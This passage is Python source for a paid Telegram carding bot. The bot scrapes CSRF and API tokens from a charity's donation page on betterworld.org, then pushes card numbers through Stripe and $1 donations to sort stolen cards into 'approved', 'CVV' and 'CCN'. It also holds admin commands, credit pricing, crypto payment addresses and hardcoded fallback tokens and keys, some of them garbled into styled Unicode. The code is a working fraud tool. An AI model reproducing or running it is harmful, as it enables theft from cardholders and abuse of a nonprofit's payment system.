                    config_text = ''.join(char for char in config_text if char.isprintable() or char in ' \t\n\r')
                    
                    json_pattern = r'\{.*\}'
                    json_match = re.search(json_pattern, config_text, re.DOTALL)
                    if json_match:
                        config_text = json_match.group(0)
                    
                    try:
                        return json.loads(config_text)
                    except json.JSONDecodeError:
                        config_text = re.sub(r',\s*}', '}', config_text)
                        config_text = re.sub(r',\s*]', ']', config_text)
                        try:
                            return json.loads(config_text)
                        except:
                            continue
            
            return None
        except:
            return None

    def get_fresh_tokens(self) -> Tuple[Optional[Dict], Optional[str]]:
        for attempt in range(3):
            try:
                headers = {
                    **self.base_headers,
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'upgrade-insecure-requests': '1',
                }
                
                response = self.session.get(
                    'https://thecasandramyersfoundation.betterworld.org/campaigns/small-acts-create-big-impacts-d',
                    headers=headers,
                    timeout=30,
                    verify=False
                )
                
                if response.status_code != 200:
                    time.sleep(2)
                    continue

                tokens = {}
                
                csrf_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
                if csrf_match:
                    tokens['csrf_token'] = self.decode_html_entities(csrf_match.group(1))
                else:
                    csrf_patterns = [
                        r'name="csrf-token"[^>]*content="([^"]+)"',
                        r'csrf-token["\']?\s*[:=]\s*["\']([^"\']+)',
                    ]
                    for pattern in csrf_patterns:
                        alt_match = re.search(pattern, response.text)
                        if alt_match:
                            tokens['csrf_token'] = self.decode_html_entities(alt_match.group(1))
                            break

                config_data = self.extract_json_from_html(response.text)
                if config_data:
                    if 'api_keys' in config_data:
                        api_keys = config_data['api_keys']
                        if 'bwc' in api_keys:
                            tokens['auth_token'] = api_keys['bwc']
                        if 'stripe' in api_keys:
                            stripe_keys = api_keys['stripe']
                            if isinstance(stripe_keys, dict):
                                tokens['stripe_key'] = stripe_keys.get('escrow')
                            elif isinstance(stripe_keys, str):
                                tokens['stripe_key'] = stripe_keys

                if not tokens.get('auth_token'):
                    script_pattern = r'<script[^>]*>\s*(window\.|var\s+)?bwConfig\s*=\s*({.*?})\s*;?\s*</script>'
                    script_match = re.search(script_pattern, response.text, re.DOTALL)
                    if script_match:
                        try:
                            script_config = json.loads(script_match.group(2))
                            if 'api_keys' in script_config and 'bwc' in script_config['api_keys']:
                                tokens['auth_token'] = script_config['api_keys']['bwc']
                        except:
                            pass

                if not tokens.get('csrf_token'):
                    tokens['csrf_token'] = 'xDvak5E+hrdT6BV6bMEeD4bTVaXN++PijWk5etvpC00YAJBSSPN7/bPgrhALOimtFUlgOisu4zgpXrjA0+TPVQ=='
                
                if not tokens.get('auth_token'):
                    tokens['auth_token'] = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c3IiOiJid2MiLCJlbnYiOiJwcm9kIiwiaXNzIjoiaHR0cHM6Ly9iZXR0ZXJ3b3JsZC5vcmciLCJleHAiOjE3NTg3NzQ𝟴𝟭𝟵,𝗻𝗯𝗳:𝟭𝟳𝟱𝟴𝟳𝟳𝟯𝟬𝟭𝟵,𝗶𝗮𝘁:𝟭𝟳𝟱𝟴𝟳𝟳𝟯𝟬𝟭𝟵𝗳𝗤.𝗲𝟯𝗝𝘁𝟯𝗚𝗦𝘅𝗱𝗻𝗪𝟳𝗾-𝗵𝗾𝗷𝗕𝗬𝟭𝟮𝗕𝟱𝗥𝘄𝗷𝗼𝟰𝟮𝗪𝗱𝗕𝗸𝘂𝗛𝗘𝗝𝗹𝟳𝟭𝟴𝗝𝗔'
                
                if not tokens.get('stripe_key'):
                    tokens['stripe_key'] = 'pk_live_aGE2zfplg4kOqYZ4QWKOM9ah'

                if tokens.get('csrf_token') and tokens.get('auth_token'):
                    return tokens, None
                else:
                    return tokens, "𝗘𝘀𝘀𝗲𝗻𝘁𝗶𝗮𝗹 𝘁𝗼𝗸𝗲𝗻𝘀 𝗺𝗶𝘀𝘀𝗶𝗻𝗴"
                
            except Exception as e:
                print(f"𝗧𝗼𝗸𝗲𝗻 𝗲𝘅𝘁𝗿𝗮𝗰𝘁𝗶𝗼𝗻 𝗲𝗿𝗿𝗼𝗿: {str(e)}")
                time.sleep(3)
                continue
        
        return {
            'csrf_token': 'xDvak5E+hrdT6BV6bMEeD4bTVaXN++PijWk5etvpC00YAJBSSPN7/bPgrhALOimtFUlgOisu4zgpXrjA0+TPVQ==',
            'auth_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c3IiOiJid2MiLCJlbnYiOiJwcm9kIiwia𝘀𝘀:𝗶𝗮𝘁:𝟭𝟳𝟱𝟴𝟳𝟳𝟯𝟬𝟭𝟵𝗳𝗤.𝗲𝟯𝗝𝘁𝟯𝗚𝗦𝘅𝗱𝗻𝗪𝟳𝗾-𝗵𝗾𝗷𝗕𝗬𝟭𝟮𝗕𝟱𝗥𝘄𝗷𝗼𝟰𝟮𝗪𝗱𝗕𝗸𝘂𝗛𝗘𝗝𝗹𝟳𝟭𝟴𝗝𝗔',
            'stripe_key': 'pk_live_aGE2zfplg4kOqYZ4QWKOM9ah'
        }, "𝗙𝗮𝗹𝗹𝗯𝗮𝗰𝗸 𝘁𝗼𝗸𝗲𝗻𝘀 𝗹𝗼𝗮𝗱𝗲𝗱"

    def get_tokens(self):
        """Get tokens with caching"""
        current_time = time.time()
        if current_time - self.last_token_refresh > 300:
            self.token_cache, _ = self.get_fresh_tokens()
            self.last_token_refresh = current_time
        
        return self.token_cache
    
    def process_card(self, card_line: str) -> Optional[Dict]:
        """Process a single card with $1 charge"""
        card_data = self.parse_card(card_line)
        if not card_data:
            return None
        
        bin_info = self.get_bin_info(card_data['bin'])
        vbv_status = self.get_vbv_status(card_data)
        tokens = self.get_tokens()
        
        try:
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            stripe_data = (
                f'type=card&'
                f'card[number]={card_data["number"]}&'
                f'card[cvc]={card_data["cvv"]}&'
                f'card[exp_month]={card_data["month"]}&'
                f'card[exp_year]={card_data["short_year"]}&'
                f'key={tokens.get("stripe_key")}&'
                f'_stripe_version=2020-08-27'
            )
            
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=stripe_headers, 
                data=stripe_data,
                verify=False,
                timeout=30
            )
            
            payment_response_text = response.text
            
            if response.status_code != 200:
                status, emoji, status_msg = self.categorize_response(payment_response_text, payment_response_text)
                return {
                    'card': card_data['original'],
                    'status': status,
                    'emoji': emoji,
                    'status_message': status_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': payment_response_text
                }
            
            payment_method_data = response.json()
            
            if 'error' in payment_method_data:
                status, emoji, status_msg = self.categorize_response(str(payment_method_data), str(payment_method_data))
                return {
                    'card': card_data['original'],
                    'status': status,
                    'emoji': emoji,
                    'status_message': status_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': str(payment_method_data)
                }
            
            payment_method_id = payment_method_data.get("id")
            if not payment_method_id:
                return {
                    'card': card_data['original'],
                    'status': '𝗘𝗥𝗥𝗢𝗥',
                    'emoji': '❌',
                    'status_message': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱',
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱'
                }
            
            time.sleep(2)
            
            api_headers = {
                'authority': 'api.betterworld.org',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://thecasandramyersfoundation.betterworld.org',
                'referer': 'https://thecasandramyersfoundation.betterworld.org/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-csrf-token': tokens.get('csrf_token'),
                'x-requested-with': 'XMLHttpRequest',
            }
            
            api_data = {
                "amount": 1.00,
                "campaign_id": 430372,
                "comment": "",
                "cover_fees": False,
                "email": self.generate_email(),
                "form_config": {
                    "allow_anonymous": True,
                    "hide_email": False,
                    "hide_name": False,
                    "title": "Small Acts Create Big Impacts"
                },
                "fund": {"id": 0, "name": ""},
                "payment_method": {
                    "id": payment_method_id,
                    "type": "stripe_card"
                },
                "tribute": {"type": "none"}
            }
            
            response = requests.post(
                'https://api.betterworld.org/api/bw/donation/create',
                headers=api_headers,
                json=api_data,
                verify=False,
                timeout=30
            )
            
            api_response_text = response.text
            
            status, emoji, status_msg = self.categorize_response(api_response_text, payment_response_text)
            
            return {
                'card': card_data['original'],
                'status': status,
                'emoji': emoji,
                'status_message': status_msg,
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                'vbv_status': vbv_status,
                'response': api_response_text
            }
            
        except Exception as e:
            error_msg = f"𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗘𝗿𝗿𝗼𝗿: {str(e)}"
            return {
                'card': card_data['original'],
                'status': '𝗘𝗥𝗥𝗢𝗥',
                'emoji': '❌',
                'status_message': error_msg,
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                'vbv_status': vbv_status,
                'response': str(e)
            }

class CCBot:
    def __init__(self, token: str, admin_id: int = None):
        self.token = token
        self.admin_id = admin_id
        self.stripe_auth_checker = StripeAuthChecker()
        self.stripe_charge_checker = StripeChargeChecker()
        self.stripe_charge50_checker = StripeCharge50Checker()
        self.user_sessions = {}
        self.active_processes = {}
        self.bot_username = None
        self.user_modes = {}
        
        self.payment_addresses = {
            "Binance ID": "544186053",
            "USDT (BNB Smart Chain)": "0x975a69e3bbe7aedeabda3d06171de36dfd36beb7",
            "LTC": "LX916U3zYDViV8g97ZX7kDDM2gxSoQyL3x",
            "BTC": "bc1qamxxzk7wgzznsle7d8nd4vhe4z2ly5tk30532m"
        }
        
        # Updated pricing
        self.credit_packages = {
            "100": 1,    # $1 for 100 credits
            "500": 4,    # $4 for 500 credits
            "1000": 7    # $7 for 1000 credits
        }
        
        if admin_id:
            UserDatabase.add_admin(admin_id)
            UserDatabase.create_user(admin_id, "admin")
    
    def get_current_checker(self, mode):
        if mode == "stripe_auth":
            return self.stripe_auth_checker
        elif mode == "stripe_charge":
            return self.stripe_charge_checker
        elif mode == "stripe_charge50":
            return self.stripe_charge50_checker
        else:
            return self.stripe_auth_checker
        
    async def get_bot_username(self, context: ContextTypes.DEFAULT_TYPE) -> str:
        if not self.bot_username:
            self.bot_username = (await context.bot.get_me()).username
        return self.bot_username or "𝗬𝗼𝘂𝗿𝗕𝗼𝘁"
    
    async def check_user_credits(self, user_id: int, required_credits: int = 1) -> bool:
        """Check if user has enough credits or free checks"""
        if UserDatabase.is_admin(user_id):
            return True
        
        user = UserDatabase.get_user(user_id)
        if not user:
            return False
        
        credits = user.get("credits", 0)
        free_checks = user.get("free_checks_available", 0)
        
        # Check if user has either credits or free checks
        return credits >= required_credits or free_checks > 0
    
    async def deduct_credits(self, user_id: int, mode: str = "check") -> bool:
        """Deduct credits based on mode:
           - 'check': Deduct 1 free check or 1 credit for ANY card check
           - 'approved': Deduct 1 credit for APPROVED cards (only from admin-given credits)
        """
        if UserDatabase.is_admin(user_id):
            return True
        
        user = UserDatabase.get_user(user_id)
        if not user:
            return False
        
        if mode == "check":
            # Deduct from free checks first, then from credits
            free_checks = user.get("free_checks_available", 0)
            if free_checks > 0:
                UserDatabase.update_user(user_id, {
                    "free_checks_available": free_checks - 1,
                    "free_checks_used": user.get("free_checks_used", 0) + 1
                })
                return True
            else:
                # Deduct from credits
                remaining = UserDatabase.deduct_credits(user_id, 1)
                return remaining is not None
        elif mode == "approved":
            # Only deduct from admin-given credits for approved cards
            remaining = UserDatabase.deduct_credits(user_id, 1)
            return remaining is not None
        
        return True
    
    async def update_user_stats(self, user_id: int, status: str):
        user = UserDatabase.get_user(user_id)
        if not user:
            return
        
        updates = {
            "total_cards_checked": user.get("total_cards_checked", 0) + 1,
            "sessions": user.get("sessions", 0) + 1
        }
        
        if status == "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗":
            updates["approved_cards"] = user.get("approved_cards", 0) + 1
        elif status == "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗":
            updates["declined_cards"] = user.get("declined_cards", 0) + 1
        elif status == "𝗖𝗩𝗩":
            updates["cvv_cards"] = user.get("cvv_cards", 0) + 1
        elif status == "𝗖𝗖𝗡":
            updates["ccn_cards"] = user.get("ccn_cards", 0) + 1
        
        UserDatabase.update_user(user_id, updates)
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id in self.active_processes and self.active_processes[user_id]:
            self.active_processes[user_id] = False
            
            if user_id in self.user_sessions:
                self.user_sessions[user_id]['active'] = False
            
            await update.message.reply_text(
                "⏸️ *𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝘁𝗼𝗽𝗽𝗲𝗱!*\n\n"
                "𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘁𝗼𝗽𝗽𝗲𝗱. "
                "𝗬𝗼𝘂 𝗰𝗮𝗻 𝘀𝘁𝗮𝗿𝘁 𝗮 𝗻𝗲𝘄 𝗼𝗻𝗲 𝘄𝗶𝘁𝗵 /𝘀𝘁𝗮𝗿𝘁.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                "ℹ️ *𝗡𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘁𝗼 𝘀𝘁𝗼𝗽.*",
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if not context.args:
            await update.message.reply_text(
                "📢 *𝗨𝘀𝗮𝗴𝗲:* `/𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 <𝗺𝗲𝘀𝘀𝗮𝗴𝗲>`\n\n"
                "𝗦𝗲𝗻𝗱 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        message = " ".join(context.args)
        all_users = UserDatabase.get_all_users()
        
        success_count = 0
        fail_count = 0
        
        await update.message.reply_text(f"📢 *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁𝗶𝗻𝗴 𝘁𝗼 {len(all_users)} 𝘂𝘀𝗲𝗿𝘀...*", parse_mode=ParseMode.MARKDOWN)
        
        for user_data in all_users.values():
            try:
                if user_data.get("is_active", True):
                    await context.bot.send_message(
                        chat_id=user_data["user_id"],
                        text=f"📢 *𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘*\n\n{message}",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    success_count += 1
                    await asyncio.sleep(0.1)
            except Exception as e:
                fail_count += 1
        
        await update.message.reply_text(
            f"✅ *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲!*\n\n"
            f"✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: `{success_count}`\n"
            f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱: `{fail_count}`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def add_credits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘁 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if len(context.args) != 2:
            await update.message.reply_text(
                "💰 *𝗨𝘀𝗮𝗴𝗲:* `/𝗮𝗱𝗱𝗰𝗿𝗲𝗱𝗶𝘁𝘀 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗮𝗱𝗱𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵 𝟭𝟬𝟬`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        try:
            target_user_id = int(context.args[0])
            amount = int(context.args[1])
            
            if amount <= 0:
                await update.message.reply_text("❌ *𝗔𝗺𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗽𝗼𝘀𝗶𝘁𝗶𝘃𝗲.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            user = UserDatabase.get_user(target_user_id)
            if not user:
                await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            new_balance = UserDatabase.add_credits(target_user_id, amount)
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"🎉 *𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗!*\n\n"
                         f"💰 *𝗔𝗺𝗼𝘂𝗻𝘁:* `{amount}` credits\n"
                         f"💳 *𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:* `{new_balance}` credits\n\n"
                         f"𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗼𝘂𝗿 𝘀𝗲𝗿𝘃𝗶𝗰𝗲!",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ *𝗖𝗿𝗲𝗱𝗶𝘁𝘀 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!*\n\n"
                f"👤 *𝗨𝘀𝗲𝗿:* `{target_user_id}`\n"
                f"💰 *𝗔𝗺𝗼𝘂𝗻𝘁:* `{amount}`\n"
                f"💳 *𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲:* `{new_balance}`",
                parse_mode=ParseMode.MARKDOWN
            )
            
        except ValueError:
            await update.message.reply_text("❌ *𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁. 𝗨𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝗮𝗺𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗻𝘂𝗺𝗯𝗲𝗿𝘀.*", parse_mode=ParseMode.MARKDOWN)
    
    async def give_credits_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await self.add_credits_command(update, context)
    
    async def disable_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if len(context.args) != 1:
            await update.message.reply_text(
                "🚫 *𝗨𝘀𝗮𝗴𝗲:* `/𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        try:
            target_user_id = int(context.args[0])
            
            user = UserDatabase.get_user(target_user_id)
            if not user:
                await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            if not user.get("is_active", True):
                await update.message.reply_text("ℹ️ *𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            UserDatabase.update_user(target_user_id, {"is_active": False})
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="🚫 *𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗗𝗜𝗦𝗔𝗕𝗟𝗘𝗗*\n\n"
                         "𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.\n\n"
                         "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ *𝗨𝘀𝗲𝗿 𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!*\n\n"
                f"👤 *𝗨𝘀𝗲𝗿 𝗜𝗗:* `{target_user_id}`\n"
                f"👤 *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲:* @{user.get('username', 'N/A')}",
                parse_mode=ParseMode.MARKDOWN
            )
            
        except ValueError:
            await update.message.reply_text("❌ *𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗.*", parse_mode=ParseMode.MARKDOWN)
    
    async def enable_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        if len(context.args) != 1:
            await update.message.reply_text(
                "✅ *𝗨𝘀𝗮𝗴𝗲:* `/𝗲𝗻𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗲𝗻𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        try:
            target_user_id = int(context.args[0])
            
            user = UserDatabase.get_user(target_user_id)
            if not user:
                await update.message.reply_text("❌ *𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            if user.get("is_active", True):
                await update.message.reply_text("ℹ️ *𝗨𝘀𝗲𝗿 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝗻𝗮𝗯𝗹𝗲𝗱.*", parse_mode=ParseMode.MARKDOWN)
                return
            
            UserDatabase.update_user(target_user_id, {"is_active": True})
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text="✅ *𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗧𝗢𝗥𝗘𝗗*\n\n"
                         "𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝘀𝘁𝗼𝗿𝗲𝗱.\n\n"
                         "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 /𝘀𝘁𝗮𝗿𝘁 𝘁𝗼 𝗯𝗲𝗴𝗶𝗻.",
                    parse_mode=ParseMode.MARKDOWN
                )
            except:
                pass
            
            await update.message.reply_text(
                f"✅ *𝗨𝘀𝗲𝗿 𝗲𝗻𝗮𝗯𝗹𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!*\n\n"
                f"👤 *𝗨𝘀𝗲𝗿 𝗜𝗗:* `{target_user_id}`\n"
                f"👤 *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲:* @{user.get('username', 'N/A')}",
                parse_mode=ParseMode.MARKDOWN
            )
            
        except ValueError:
            await update.message.reply_text("❌ *𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗.*", parse_mode=ParseMode.MARKDOWN)
    
    async def users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if not UserDatabase.is_admin(user_id):
            await update.message.reply_text("❌ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗱𝗲𝗻𝗶𝗲𝗱. 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        all_users = UserDatabase.get_all_users()
        
        if not all_users:
            await update.message.reply_text("📭 *𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱.*", parse_mode=ParseMode.MARKDOWN)
            return
        
        users_list = []
        total_credits = 0
        active_users = 0
        
        for user_data in all_users.values():
            user_id_str = str(user_data['user_id'])
            is_admin_user = UserDatabase.is_admin(user_data['user_id'])
            status = "👑" if is_admin_user else ("✅" if user_data.get("is_active", True) else "🚫")
            username = user_data.get("username", "𝗡/𝗔")
            credits = "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if is_admin_user else user_data.get("credits", 0)
            total_cards = user_data.get("total_cards_checked", 0)
            
            users_list.append(
                f"{status} `{user_data['user_id']}` - @{username}\n"
                f"   💳 {credits} credits | 📊 {total_cards} cards"
            )
            
            if not is_admin_user:
                total_credits += user_data.get("credits", 0)
            if user_data.get("is_active", True):
                active_users += 1
        
        users_text = "\n\n".join(users_list[:50])
        
        if len(all_users) > 50:
